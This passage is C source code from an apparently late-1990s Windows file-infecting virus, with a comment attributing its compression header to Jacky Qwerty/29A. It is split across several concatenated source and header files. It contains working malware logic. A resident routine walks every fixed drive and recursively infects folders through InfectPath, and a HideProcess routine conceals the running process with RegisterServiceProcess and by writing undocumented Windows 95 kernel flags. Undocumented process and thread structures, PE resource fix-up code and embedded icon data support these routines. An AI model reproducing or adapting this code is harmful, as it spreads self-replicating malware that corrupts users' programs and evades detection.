  pRsrcDirEntry = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)(pRsrcDir + 1);
  nCount = pRsrcDir->NumberOfNamedEntries + pRsrcDir->NumberOfIdEntries;
  do
    pRsrcDirEntry->DataIsDirectory
      ? FixResources(Rva2Ptr(PIMAGE_RESOURCE_DIRECTORY,  //recursion..
			     pRsrcStart,
			     pRsrcDirEntry->OffsetToDirectory))
      : (Rva2Ptr(PIMAGE_RESOURCE_DATA_ENTRY,
		 pRsrcStart,
		 pRsrcDirEntry->OffsetToData)->OffsetToData
	   += _RvaDelta);
  while (pRsrcDirEntry++, --nCount);
}

#define LARGE_ICON 0
#define SMALL_ICON 1

PICONIMAGE GetDefaultIcon(PIMAGE_RESOURCE_DIRECTORY pRsrcDir,
			  BOOLB IconType,
			  BOOLB bFalse) {
  PIMAGE_RESOURCE_DIRECTORY_ENTRY pRsrcDirEntry;
  PIMAGE_RESOURCE_DATA_ENTRY pRsrcDataEntry;
  PICONIMAGE pIconImage;
  DWORD nCount;
  if (!pRsrcDir)
    return NULL;
  pRsrcDirEntry = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)(pRsrcDir + 1);
  nCount = pRsrcDir->NumberOfNamedEntries + pRsrcDir->NumberOfIdEntries;
  do {
    if (!bFalse && pRsrcDirEntry->Id != (WORD)RT_ICON)
      continue;
    if (pRsrcDirEntry->DataIsDirectory) {
      pIconImage = GetDefaultIcon(Rva2Ptr(PIMAGE_RESOURCE_DIRECTORY,
					  pRsrcStart,
					  pRsrcDirEntry->OffsetToDirectory),
				  IconType,
				  TRUE);
      if (!pIconImage)
	continue;
      return pIconImage;
    }
    pRsrcDataEntry = Rva2Ptr(PIMAGE_RESOURCE_DATA_ENTRY,
			     pRsrcStart,
			     pRsrcDirEntry->OffsetToData);
    pIconImage = Rva2Raw(pRsrcDataEntry->OffsetToData);
    if (pIconImage->icHeader.biSize != sizeof(BITMAPINFOHEADER) ||
	pIconImage->icHeader.biWidth != (IconType == LARGE_ICON
					   ? 32
					   : 16) ||
	pIconImage->icHeader.biHeight != (IconType == LARGE_ICON
					    ? 64
					    : 32) ||
	pIconImage->icHeader.biPlanes != 1 ||
	pIconImage->icHeader.biBitCount != 4)
      continue;
    return pIconImage;
  } while (++pRsrcDirEntry, --nCount);
  return NULL;
}

VOID GetDefaultIcons(PICONIMAGES pIconImages,
		     PVOID pNEorPE) {
  if (((PIMAGE_NT_HEADERS)pNEorPE)->Signature == IMAGE_NT_SIGNATURE) {
    PIMAGE_NT_HEADERS pPE = _pHostPE = (PIMAGE_NT_HEADERS)pNEorPE;
    PIMAGE_RESOURCE_DIRECTORY pRsrcDir =
      pRsrcStart =
	Rva2Raw(pPE->OptionalHeader.
		     DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].
		     VirtualAddress);
    pIconImages->pLargeIcon = GetDefaultIcon(pRsrcDir, LARGE_ICON, FALSE);
    pIconImages->pSmallIcon = GetDefaultIcon(pRsrcDir, SMALL_ICON, FALSE);
    return;
  }
  if (((PIMAGE_OS2_HEADER)pNEorPE)->ne_magic == IMAGE_OS2_SIGNATURE) {
    PIMAGE_OS2_HEADER pNE = (PIMAGE_OS2_HEADER)pNEorPE;
    BYTE align = *Rva2Ptr(PBYTE, pNE, pNE->ne_rsrctab);
    PRESOURCE_TYPE
      pRsrcType = Rva2Ptr(PRESOURCE_TYPE, pNE, pNE->ne_rsrctab + 2),
      pRsrcEnd = Rva2Ptr(PRESOURCE_TYPE, pNE, pNE->ne_restab);
    while (pRsrcType < pRsrcEnd && pRsrcType->ID) {
      if (pRsrcType->ID == (0x8000 | (WORD)RT_ICON)) {
	PRESOURCE_INFO pRsrcInfo = (PRESOURCE_INFO)(pRsrcType + 1);
	DWORD nCount = 0;
	do {
	  PICONIMAGE pIconImage = Rva2Ptr(PICONIMAGE,
					  pMZ,
					  pRsrcInfo++->offset << align);
	  if (pIconImage->icHeader.biSize == sizeof(BITMAPINFOHEADER) &&
	      pIconImage->icHeader.biPlanes == 1 &&
	      pIconImage->icHeader.biBitCount == 4)
	    if (!pIconImages->pLargeIcon &&
		 pIconImage->icHeader.biWidth == 32 &&
		 pIconImage->icHeader.biHeight == 64)
	      pIconImages->pLargeIcon = pIconImage;
	    else
	    if (!pIconImages->pSmallIcon &&
		 pIconImage->icHeader.biWidth == 16 &&
		 pIconImage->icHeader.biHeight == 32)
	      pIconImages->pSmallIcon = pIconImage;
	  if (pIconImages->pLargeIcon && pIconImages->pSmallIcon)
	    goto breakall;
	} while (++nCount < pRsrcType->count);
      }
      pRsrcType =
	(PRESOURCE_TYPE)
	  ((PBYTE)pRsrcType + sizeof(RESOURCE_TYPE)
	     + pRsrcType->count * sizeof(RESOURCE_INFO));
    }
    breakall:;
  }
}
#endif

#ifdef tsr
__inline VOID SeekTSR() {
  DWORD cBytes;
  PBYTE pszDrvs, pszDrive;
  UINT uDriveType;
  if (!(cBytes = GetLogicalDriveStrings(0, NULL)) ||
      !(pszDrvs = (PBYTE)GlobalAlloc(LPTR, cBytes + 1)))
    return;
  if (GetLogicalDriveStrings(cBytes, pszDrvs) - 1 < cBytes) {
    #if PREV_LAPSE
    Sleep(PREV_LAPSE * 1000);
    #endif
    do {
      pszDrive = pszDrvs;
      do {
	if ((uDriveType = GetDriveType(pszDrive)) <= DRIVE_REMOVABLE ||
	    uDriveType == DRIVE_CDROM)
	  continue;
	#ifdef msgbox
	if (CancelFolderSeek)
	  CancelFolderSeek = FALSE;
	#endif
	WalkFolder(lstrcpy(PathName, pszDrive));
      } while (*(pszDrive += lstrlen(pszDrive) + 1));
      #ifdef msgbox
      if (CancelFolderSeek)
	break;
      #endif
    } while (TRUE);
    #ifdef msgbox
    CloseHandle(hMutex);
    #if 1
    MessageBox(NULL, "TSR: Mutex destroyed!", szCopyright, MB_OK);
    #endif
    #endif
  }
  #ifdef msgbox
  GlobalFree(pszDrvs);
  #endif
}

VOID WalkFolder(PBYTE PathName) {
  DWORD cBytes;
  HANDLE hFindFile;
  Sleep(SEEK_LAPSE * 1000);
  InfectPath(PathName, cBytes = lstrlen(PathName));
  if (PathName[cBytes - 1] != '\\')
    PathName[cBytes++] = '\\';
  *(PDWORD)(PathName + cBytes) = '*.*';
  if ((hFindFile = FindFirstFile(PathName, &FindDataTSR)) ==
	INVALID_HANDLE_VALUE)
    return;
  do {
    #ifdef msgbox
    if (CancelFolderSeek)
      break;
    #endif
    if (!IsFolder(&FindDataTSR))
      continue;
    lstrcpy(PathName + cBytes, FindDataTSR.cFileName);
    WalkFolder(PathName);			     //recurse folders..
  } while (FindNextFile(hFindFile, &FindDataTSR));
  FindClose(hFindFile);
}

//VOID HideProcess() {				     //Unsecure way to
//  PTHREAD_DATABASE pThreadDB = GetThreadDB();      //hide our process.
//  if (pThreadDB->pProcess->Type != K32OBJ_PROCESS) //This is undocumented
//    return;					     //Microsoft stuff,
//  pThreadDB->pProcess->flags |= fServiceProcess;   //likely to GP fault!
//}						     //Code bellow is better

VOID HideProcess() {
  { //do it the legal undoc. way..
    DWORD (WINAPI *pfnRegisterServiceProcess)(DWORD, DWORD);
    pfnRegisterServiceProcess =
      (DWORD (WINAPI *)(DWORD, DWORD))
	GetProcAddress(GetModuleHandle("KERNEL32"),
		       "RegisterServiceProcess");
    if (pfnRegisterServiceProcess)
      pfnRegisterServiceProcess(0, 1);
  }
  { //do it the ilegal dirty way, just in case..
    PPROCESS_DATABASE pProcessDB = GetProcessDB();
    HANDLE hProcess = GetCurrentProcess();
    DWORD dwBuffer, nBytes;
    if (!ReadProcessMemory(hProcess, &pProcessDB->Type,
			   &dwBuffer, 4, &nBytes) ||
	nBytes != 4 || dwBuffer != K32OBJ_PROCESS ||
	!ReadProcessMemory(hProcess, &pProcessDB->flags,
			   &dwBuffer, 4, &nBytes) ||
	nBytes != 4)
      return;
    dwBuffer |= fServiceProcess;
    WriteProcessMemory(hProcess, &pProcessDB->flags,
		       &dwBuffer, 4, &nBytes);
  }
}

__inline PPROCESS_DATABASE GetProcessDB() {
  PPROCESS_DATABASE pProcessDB;
  DWORD nBytes;
  return (!ReadProcessMemory(GetCurrentProcess(), &GetThreadDB()->pProcess,
			     &pProcessDB, 4, &nBytes) ||
	  nBytes != 4)
	    ? NULL
	    : pProcessDB;
}

__inline PTHREAD_DATABASE GetThreadDB() {
  __asm push -10h
  __asm pop eax
  __asm add eax,fs:[TIB.ptibSelf + (eax + 10h)]  //(eax + 10h) = 0
}
#endif

//end
????????????????????????????????????????????????????????????????[win32red.c]??
????????????????????????????????????????????????????????????????[win95sys.h]??
//WIN95SYS - Win95 System Structures
//
//Some powerful Win95 structs that Microsoft dont want us to know about.
//These are much like the Win95 implementation of the SFTs found in DOS.

//Last minute note (Nov/10/98): Unfortunately some of the fields in these
//  structures broke on Win98. More especifically I dunno where the Process
//  database structure lies in memory. However the 'RegisterServiceProcess'
//  API is still exported from KERNEL32 and so our nasty trick with the
//  'Task Bar' still works there. Under NT this story is out of scope.  JQ.


//Kernel32 objects

#define K32OBJ_SEMAPHORE	    0x1
#define K32OBJ_EVENT		    0x2
#define K32OBJ_MUTEX		    0x3
#define K32OBJ_CRITICAL_SECTION     0x4
#define K32OBJ_PROCESS		    0x5
#define K32OBJ_THREAD		    0x6
#define K32OBJ_FILE		    0x7
#define K32OBJ_CHANGE		    0x8
#define K32OBJ_CONSOLE		    0x9
#define K32OBJ_SCREEN_BUFFER	    0xA
#define K32OBJ_MEM_MAPPED_FILE	    0xB
#define K32OBJ_SERIAL		    0xC
#define K32OBJ_DEVICE_IOCTL	    0xD
#define K32OBJ_PIPE		    0xE
#define K32OBJ_MAILSLOT 	    0xF
#define K32OBJ_TOOLHELP_SNAPSHOT    0x10
#define K32OBJ_SOCKET		    0x11


//Process Database flags

#define fDebugSingle		0x00000001
#define fCreateProcessEvent	0x00000002
#define fExitProcessEvent	0x00000004
#define fWin16Process		0x00000008
#define fDosProcess		0x00000010
#define fConsoleProcess 	0x00000020
#define fFileApisAreOem 	0x00000040
#define fNukeProcess		0x00000080
#define fServiceProcess 	0x00000100
#define fLoginScriptHack	0x00000800


//Thread Database flags

#define fCreateThreadEvent	0x00000001
#define fCancelExceptionAbort	0x00000002
#define fOnTempStack		0x00000004
#define fGrowableStack		0x00000008
#define fDelaySingleStep	0x00000010
#define fOpenExeAsImmovableFile 0x00000020
#define fCreateSuspended	0x00000040
#define fStackOverflow		0x00000080
#define fNestedCleanAPCs	0x00000100
#define fWasOemNowAnsi		0x00000200
#define fOKToSetThreadOem	0x00000400


#pragma pack(1)


//MODREF and IMTE structures

typedef struct _MODREF {
    struct _MODREF *pNextModRef;    // 00h
    DWORD	    un1;	    // 04h
    DWORD	    un2;	    // 08h
    DWORD	    un3;	    // 0Ch
    WORD	    mteIndex;	    // 10h
    WORD	    un4;	    // 12h
    DWORD	    un5;	    // 14h
    PVOID	    ppdb;	    // 18h Pointer to process database
    DWORD	    un6;	    // 1Ch
    DWORD	    un7;	    // 20h
    DWORD	    un8;	    // 24h
} MODREF, *PMODREF;

typedef struct _IMTE {
    DWORD	    un1;	    // 00h
    PIMAGE_NT_HEADERS	pNTHdr;     // 04h
    DWORD	    un2;	    // 08h
    PSTR	    pszFileName;    // 0Ch
    PSTR	    pszModName;     // 10h
    WORD	    cbFileName;     // 14h
    WORD	    cbModName;	    // 16h
    DWORD	    un3;	    // 18h
    DWORD	    cSections;	    // 1Ch
    DWORD	    un5;	    // 20h
    DWORD	    baseAddress;    // 24h
    WORD	    hModule16;	    // 28h
    WORD	    cUsage;	    // 2Ah
    DWORD	    un7;	    // 2Ch
    PSTR	    pszFileName2;   // 30h
    WORD	    cbFileName2;    // 34h
    DWORD	    pszModName2;    // 36h
    WORD	    cbModName2;     // 3Ah
} IMTE, *PIMTE;


//Process Database structure

typedef struct _ENVIRONMENT_DATABASE {
PSTR	pszEnvironment;     // 00h Pointer to Environment
DWORD	un1;		    // 04h
PSTR	pszCmdLine;	    // 08h Pointer to command line
PSTR	pszCurrDirectory;   // 0Ch Pointer to current directory
LPSTARTUPINFOA pStartupInfo;// 10h Pointer to STARTUPINFOA struct
HANDLE	hStdIn; 	    // 14h Standard Input
HANDLE	hStdOut;	    // 18h Standard Output
HANDLE	hStdErr;	    // 1Ch Standard Error
DWORD	un2;		    // 20h
DWORD	InheritConsole;     // 24h
DWORD	BreakType;	    // 28h
DWORD	BreakSem;	    // 2Ch
DWORD	BreakEvent;	    // 30h
DWORD	BreakThreadID;	    // 34h
DWORD	BreakHandlers;	    // 38h
} ENVIRONMENT_DATABASE, *PENVIRONMENT_DATABASE;

typedef struct _HANDLE_TABLE_ENTRY {
    DWORD   flags;	// Valid flags depend on what type of object this is
    PVOID   pObject;	// Pointer to the object that the handle refers to
} HANDLE_TABLE_ENTRY, *PHANDLE_TABLE_ENTRY;

typedef struct _HANDLE_TABLE {
    DWORD   cEntries;		    // Max number of handles in table
    HANDLE_TABLE_ENTRY array[1];    // An array (number is given by cEntries)
} HANDLE_TABLE, *PHANDLE_TABLE;

typedef struct _PROCESS_DATABASE {
DWORD	Type;		    // 00h KERNEL32 object type (5)
DWORD	cReference;	    // 04h Number of references to process
DWORD	un1;		    // 08h
DWORD	someEvent;	    // 0Ch An event object (What's it used for???)
DWORD	TerminationStatus;  // 10h Returned by GetExitCodeProcess
DWORD	un2;		    // 14h
DWORD	DefaultHeap;	    // 18h Address of the process heap
DWORD	MemoryContext;	    // 1Ch pointer to the process's context
DWORD	flags;		    // 20h
			    // 0x00000001 - fDebugSingle
			    // 0x00000002 - fCreateProcessEvent
			    // 0x00000004 - fExitProcessEvent
			    // 0x00000008 - fWin16Process
			    // 0x00000010 - fDosProcess
			    // 0x00000020 - fConsoleProcess
			    // 0x00000040 - fFileApisAreOem
			    // 0x00000080 - fNukeProcess
			    // 0x00000100 - fServiceProcess
			    // 0x00000800 - fLoginScriptHack
DWORD	pPSP;		    // 24h Linear address of PSP?
WORD	PSPSelector;	    // 28h
WORD	MTEIndex;	    // 2Ah
WORD	cThreads;	    // 2Ch
WORD	cNotTermThreads;    // 2Eh
WORD	un3;		    // 30h
WORD	cRing0Threads;	    // 32h number of ring 0 threads
HANDLE	HeapHandle;	    // 34h Heap to allocate handle tables out of
			    //	   This seems to always be the KERNEL32 heap
HTASK	W16TDB; 	    // 38h Win16 Task Database selector
DWORD	MemMapFiles;	    // 3Ch memory mapped file list (?)
PENVIRONMENT_DATABASE pEDB; // 40h Pointer to Environment Database
PHANDLE_TABLE pHandleTable; // 44h Pointer to process handle table
struct _PROCESS_DATABASE *ParentPDB;   // 48h Parent process database
PMODREF MODREFlist;	    // 4Ch Module reference list
DWORD	ThreadList;	    // 50h Threads in this process
DWORD	DebuggeeCB;	    // 54h Debuggee Context block?
DWORD	LocalHeapFreeHead;  // 58h Head of free list in process heap
DWORD	InitialRing0ID;     // 5Ch
CRITICAL_SECTION    crst;   // 60h
DWORD	un4[3]; 	    // 78h
DWORD	pConsole;	    // 84h Pointer to console for process
DWORD	tlsInUseBits1;	    // 88h  // Represents TLS indices 0 - 31
DWORD	tlsInUseBits2;	    // 8Ch  // Represents TLS indices 32 - 63
DWORD	ProcessDWORD;	    // 90h
struct _PROCESS_DATABASE *ProcessGroup;    // 94h
DWORD	pExeMODREF;	    // 98h pointer to EXE's MODREF
DWORD	TopExcFilter;	    // 9Ch Top Exception Filter?
DWORD	BasePriority;	    // A0h Base scheduling priority for process
DWORD	HeapOwnList;	    // A4h Head of the list of process heaps
DWORD	HeapHandleBlockList;// A8h Pointer to head of heap handle block list
DWORD	pSomeHeapPtr;	    // ACh normally zero, but can a pointer to a
			    // moveable handle block in the heap
DWORD	pConsoleProvider;   // B0h Process that owns the console we're using?
WORD	EnvironSelector;    // B4h Selector containing process environment
WORD	ErrorMode;	    // B6H SetErrorMode value (also thunks to Win16)
DWORD	pevtLoadFinished;   // B8h Pointer to event LoadFinished?
WORD	UTState;	    // BCh
} PROCESS_DATABASE, *PPROCESS_DATABASE;


//TIB (Thread Information Block) structure

typedef struct _SEH_record {
    struct _SEH_record *pNext;
    FARPROC		pfnHandler;
} SEH_record, *PSEH_record;

// This is semi-documented in the NTDDK.H file from the NT DDK
typedef struct _TIB {
PSEH_record pvExcept;	    // 00h Head of exception record list
PVOID	pvStackUserTop;     // 04h Top of user stack
PVOID	pvStackUserBase;    // 08h Base of user stack
WORD	pvTDB;		    // 0Ch TDB
WORD	pvThunksSS;	    // 0Eh SS selector used for thunking to 16 bits
DWORD	SelmanList;	    // 10h
PVOID	pvArbitrary;	    // 14h Available for application use
struct _tib *ptibSelf;	    // 18h Linear address of TIB structure
WORD	TIBFlags;	    // 1Ch
WORD	Win16MutexCount;    // 1Eh
DWORD	DebugContext;	    // 20h
DWORD	pCurrentPriority;   // 24h
DWORD	pvQueue;	    // 28h Message Queue selector
PVOID  *pvTLSArray;	    // 2Ch Thread Local Storage array
} TIB, *PTIB;


//TDBX structure

typedef struct _TDBX {
    DWORD   ptdb;		// 00h	// PTHREAD_DATABASE
    DWORD   ppdb;		// 04h	// PPROCESDS_DATABASE
    DWORD   ContextHandle;	// 08h
    DWORD   un1;		// 0Ch
    DWORD   TimeOutHandle;	// 10h
    DWORD   WakeParam;		// 14h
    DWORD   BlockHandle;	// 18h
    DWORD   BlockState; 	// 1Ch
    DWORD   SuspendCount;	// 20h
    DWORD   SuspendHandle;	// 24h
    DWORD   MustCompleteCount;	// 28h
    DWORD   WaitExFlags;	// 2Ch
				// 0x00000001 - WAITEXBIT
				// 0x00000002 - WAITACKBIT
				// 0x00000004 - SUSPEND_APC_PENDING
				// 0x00000008 - SUSPEND_TERMINATED
				// 0x00000010 - BLOCKED_FOR_TERMINATION
				// 0x00000020 - EMULATE_NPX
				// 0x00000040 - WIN32_NPX
				// 0x00000080 - EXTENDED_HANDLES
				// 0x00000100 - FROZEN
				// 0x00000200 - DONT_FREEZE
				// 0x00000400 - DONT_UNFREEZE
				// 0x00000800 - DONT_TRACE
				// 0x00001000 - STOP_TRACING
				// 0x00002000 - WAITING_FOR_CRST_SAFE
				// 0x00004000 - CRST_SAFE
				// 0x00040000 - BLOCK_TERMINATE_APC
    DWORD   SyncWaitCount;	// 30h
    DWORD   QueuedSyncFuncs;	// 34h
    DWORD   UserAPCList;	// 38h
    DWORD   KernAPCList;	// 3Ch
    DWORD   pPMPSPSelector;	// 40h
    DWORD   BlockedOnID;	// 44h
    DWORD   un2[7];		// 48h
    DWORD   TraceRefData;	// 64h
    DWORD   TraceCallBack;	// 68h
    DWORD   TraceEventHandle;	// 6Ch
    WORD    TraceOutLastCS;	// 70h
    WORD    K16TDB;		// 72h
    WORD    K16PDB;		// 74h
    WORD    DosPDBSeg;		// 76h
    WORD    ExceptionCount;	// 78h
} TDBX, *PTDBX;


//Thread Database structure

typedef struct _THREAD_DATABASE {
DWORD	Type;		    // 00h
DWORD	cReference;	    // 04h
PPROCESS_DATABASE pProcess; // 08h
DWORD	someEvent;	    // 0Ch An event object (What's it used for???)
DWORD	pvExcept;	    // 10h This field through field 3CH is a TIB
			    //	    structure (see TIB.H)
DWORD	TopOfStack;	    // 14h
DWORD	StackLow;	    // 18h
WORD	W16TDB; 	    // 1Ch
WORD	StackSelector16;    // 1Eh Used when thunking down to 16 bits
DWORD	SelmanList;	    // 20h
DWORD	UserPointer;	    // 24h
PTIB	pTIB;		    // 28h
WORD	TIBFlags;	    // 2Ch  TIBF_WIN32 = 1, TIBF_TRAP = 2
WORD	Win16MutexCount;    // 2Eh
DWORD	DebugContext;	    // 30h
PDWORD	pCurrentPriority;   // 34h
DWORD	MessageQueue;	    // 38h
DWORD	pTLSArray;	    // 3Ch
PPROCESS_DATABASE pProcess2;// 40h Another copy of the thread's process???
DWORD	Flags;		    // 44h
			    // 0x00000001 - fCreateThreadEvent
			    // 0x00000002 - fCancelExceptionAbort
			    // 0x00000004 - fOnTempStack
			    // 0x00000008 - fGrowableStack
			    // 0x00000010 - fDelaySingleStep
			    // 0x00000020 - fOpenExeAsImmovableFile
			    // 0x00000040 - fCreateSuspended
			    // 0x00000080 - fStackOverflow
			    // 0x00000100 - fNestedCleanAPCs
			    // 0x00000200 - fWasOemNowAnsi
			    // 0x00000400 - fOKToSetThreadOem
DWORD	TerminationStatus;  // 48h Returned by GetExitCodeThread
WORD	TIBSelector;	    // 4Ch
WORD	EmulatorSelector;   // 4Eh
DWORD	cHandles;	    // 50h
DWORD	WaitNodeList;	    // 54h
DWORD	un4;		    // 58h
DWORD	Ring0Thread;	    // 5Ch
PTDBX	pTDBX;		    // 60
DWORD	StackBase;	    // 64h
DWORD	TerminationStack;   // 68h
DWORD	EmulatorData;	    // 6Ch
DWORD	GetLastErrorCode;   // 70h
DWORD	DebuggerCB;	    // 74h
DWORD	DebuggerThread;     // 78h
PCONTEXT    ThreadContext;  // 7Ch  // register context defined in WINNT.H
DWORD	Except16List;	    // 80h
DWORD	ThunkConnect;	    // 84h
DWORD	NegStackBase;	    // 88h
DWORD	CurrentSS;	    // 8Ch
DWORD	SSTable;	    // 90h
DWORD	ThunkSS16;	    // 94h
DWORD	TLSArray[64];	    // 98h
DWORD	DeltaPriority;	    // 198h

// The retail version breaks off somewhere around here.
// All the remaining fields are most likely only in the debug version

DWORD	un5[7]; 	    // 19Ch
DWORD	pCreateData16;	    // 1B8h
DWORD	APISuspendCount;    // 1BCh # of times SuspendThread has been called
DWORD	un6;		    // 1C0h
DWORD	WOWChain;	    // 1C4h
WORD	wSSBig; 	    // 1C8h
WORD	un7;		    // 1CAh
DWORD	lp16SwitchRec;	    // 1CCh
DWORD	un8[6]; 	    // 1D0h
DWORD	pSomeCritSect1;     // 1E8h
DWORD	pWin16Mutex;	    // 1ECh
DWORD	pWin32Mutex;	    // 1F0h
DWORD	pSomeCritSect2;     // 1F4h
DWORD	un9;		    // 1F8h
DWORD	ripString;	    // 1FCh
DWORD	LastTlsSetValueEIP[64]; // 200h (parallel to TlsArray, contains EIP
				//	where TLS value was last set from)
} THREAD_DATABASE, *PTHREAD_DATABASE;
????????????????????????????????????????????????????????????????[win95sys.h]??
????????????????????????????????????????????????????????????????[jqcoding.h]??
/*
 JQCODING.H - Supertiny/fast Compression/Encryption library - C/C++ header
 (c) 1998 by Jacky Qwerty/29A.
 */

unsigned long
__stdcall
jq_encode(void		*out,		/* output stream ptr */
	  const void	*in,		/* input stream ptr */
	  unsigned long  in_len,	/* input stream length */
	  void		*mem64k);	/* work mem ptr */

unsigned long
__stdcall
jq_decode(void		*out,		/* output stream ptr */
	  const void	*in,		/* input stream ptr */
	  unsigned long  in_len,	/* input stream length */
	  void		*mem64k);	/* work mem ptr */
????????????????????????????????????????????????????????????????[jqcoding.h]??
????????????????????????????????????????????????????????????????[winicons.h]??
// Win16/32 related Icon structures..

#include 

#define SIZEOF_LARGE_ICON 0x2E8
#define SIZEOF_SMALL_ICON 0x128

#define SIZEOF_ICONS (SIZEOF_LARGE_ICON + SIZEOF_SMALL_ICON)

// Icon format (ID = 03h)

typedef struct _ICONIMAGE {
  BITMAPINFOHEADER icHeader;	 // DIB header
  RGBQUAD	   icColors[1];  // Color table
  BYTE		   icXOR[1];	 // DIB bits for XOR mask
  BYTE		   icAND[1];	 // DIB bits for AND mask
} ICONIMAGE, *PICONIMAGE;

// Group Icon format (ID = 0Eh)

typedef struct _ICONDIRENTRY {
  BYTE	 bWidth;		 // Width, in pixels, of the image
  BYTE	 bHeight;		 // Height, in pixels, of the image
  BYTE	 bColorCount;		 // Number of colors in image (0 if >=8bpp)
  BYTE	 bReserved;		 // Reserved
  WORD	 wPlanes;		 // Color Planes
  WORD	 wBitCount;		 // Bits per pixel
  DWORD  dwBytesInRes;		 // how many bytes in this resource?
  WORD	 nID;			 // the ID
} ICONDIRENTRY, *PICONDIRENTRY;

#define SIZEOF_ICONDIRENTRY sizeof(ICONDIRENTRY)

typedef struct _ICONDIR {
  WORD		  idReserved;	 // Reserved (must be 0)
  WORD		  idType;	 // Resource type (1 for icons)
  WORD		  idCount;	 // How many images?
  ICONDIRENTRY	  idEntries[1];  // The entries for each image
} ICONDIR, *PICONDIR;

#define SIZEOF_ICONDIR 6
????????????????????????????????????????????????????????????????[winicons.h]??
??????????????????????????????????????????????????????????????????[winres.h]??
//Win16 (NE) related resource structures..

typedef struct {
  WORD	ID;
  WORD	count;
  DWORD function;
} RESOURCE_TYPE, *PRESOURCE_TYPE;

typedef struct {
  WORD	  offset;
  WORD	  length;
  WORD	  flags;
  WORD	  ID;
  WORD	  handle;
  WORD	  usage;
} RESOURCE_INFO, *PRESOURCE_INFO;
??????????????????????????????????????????????????????????????????[winres.h]??
????????????????????????????????????????????????????????????????[jq29aico.h]??
#ifdef compr

BYTE jq29aComprIcons[] = {
  0xd7,0x45,0xb1,0x44,0xc6,0x7d,0x61,0xa8,0x96,0xc0,0x9d,0x74,0xbb,
  0x6d,0xbc,0x6b,0xa0,0xa6,0x57,0xc8,0x76,0x77,0x64,0x0c,0x7e,0x9a,
  0x2f,0xb8,0xd2,0xcd,0xbc,0xa3,0xa0,0x33,0x50,0x3b,0x90,0x3b,0x1f,
  0x46,0xe9,0xb2,0x7f,0xe4,0xd0,0x28,0x13,0x4e,0xfa,0x92,0x3e,0xcc,
  0xd1,0xc3,0x92,0x95,0x1c,0x5e,0xda,0xaf,0x45,0x91,0x44,0xee,0xc7,
  0x95,0x31,0x04,0x13,0x3d,0x1c,0x23,0x5d,0xa1,0x59,0xa9,0x34,0x0e,
  0x7a,0x92,0x3f,0x65,0xac,0x3e,0x67,0xa8,0x4b,0x8d,0x7c,0x9e,0x27,
  0x55,0xcc,0x83,0x60,0xa6,0x57,0xc8,0xf6,0x8a,0x72,0xff,0xe5,0xd1,
  0xb9,0x14,0x33,0x7d,0xe1,0xa4,0x53,0xc0,0x9b,0x50,0xbb,0x10,0x3b,
  0x6d,0xc1,0xe4,0xae,0xda,0x11,0x41,0xe1,0x1a,0x42,0x9d,0x1a,0xb3,
  0x00,0x54,0x32,0x51,0x17,0x08,0xb9,0xe5,0x50,0x49,0x6e,0x4c,0x0c,
  0x9f,0x26,0x16,0xcb,0x16,0xea,0xb6,0xa9,0x91,0xcc,0xb3,0x63,0xed,
  0xf9,0xbc,0xa1,0x2c,0x10,0x75,0x06,0x60,0xd2,0x51,0xd0,0x01,0xcf,
  0xda,0xae,0xf1,0x14,0x97,0xa3,0x32,0x1c,0x7e,0x8e,0xca,0x90,0x2b,
  0x4e,0x4a,0x6c,0x82,0x91,0xd3,0xed,0x96,0x67,0xca,0xef,0x05,0x07,
  0x3b,0xb6,0x1e,0x87,0xfb,0xe3,0x06,0xfe,0x2f,0xca,0x08,0x85,0x16,
  0x2f,0xca,0x3f,0x83,0x9e,0x59,0x11,0xfd,0x97,0x46,0xc9,0x31,0x9b,
  0x97,0x95,0x37,0x07,0x02,0x6f,0xc5,0x2b,0xce,0xf7,0x95,0x31,0x1a,
  0x82,0x72,0xdf,0xd8,0x4c,0x3e,0x68,0xd9,0x1f,0x83,0x9d,0x6e,0xde,
  0xa7,0x55,0xb9,0x04,0x93,0x40,0xe6,0x2a,0xcf,0x67,0x16,0x37,0x75,
  0xf1,0x04,0xd5,0xc7,0x55,0x0c,0xbe,0x9a,0x27,0xc5,0x6c,0x43,0xe0,
  0xb5,0x2a,0x31,0x02,0x1f,0x24,0x2b,0xb2,0x9c,0x5c,0xa3,0x5d,0xa0,
  0x8b,0x53,0xbc,0x1b,0x5d,0x1f,0x55,0xcc,0xfe,0xe7,0xd5,0xcc,0xfe,
  0xe7,0xd5,0xcc,0xfe,0xe7,0xa8,0x36,0x77,0x88,0x96,0x03,0xd2,0x6c,
  0xe1,0xee,0x3a,0x54,0xaf,0x5f,0x9d,0xaf,0x8e,0xc8,0x0c,0xc4,0x29,
  0xa7,0x0f,0x77,0x1b,0x4f,0xba,0xd0,0xb2,0x6c,0xaf,0xe3,0xaa,0x26,
  0x58,0x20,0x00,0x5b,0xf3,0x76,0xf2,0x2c,0xb3,0x59,0xd4,0xa1,0x50,
  0x18,0x48,0x00,0x6b,0x2d,0x79,0xee,0xc0,0x04,0x44,0xe2,0xd2,0x59
};

#define SIZEOF_COMPR_ICONS sizeof(jq29aComprIcons)

#else

BYTE jq29aIcons[] = {
  0x28,0x00,0x00,0x00,0x20,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x01,
  0x00,0x04,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x80,0x00,0x00,0x80,0x00,0x00,
  0x00,0x80,0x80,0x00,0x80,0x00,0x00,0x00,0x80,0x00,0x80,0x00,0x80,
  0x80,0x00,0x00,0xc0,0xc0,0xc0,0x00,0x80,0x80,0x80,0x00,0x00,0x00,
  0xff,0x00,0x00,0xff,0x00,0x00,0x00,0xff,0xff,0x00,0xff,0x00,0x00,
  0x00,0xff,0x00,0xff,0x00,0xff,0xff,0x00,0x00,0xff,0xff,0xff,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
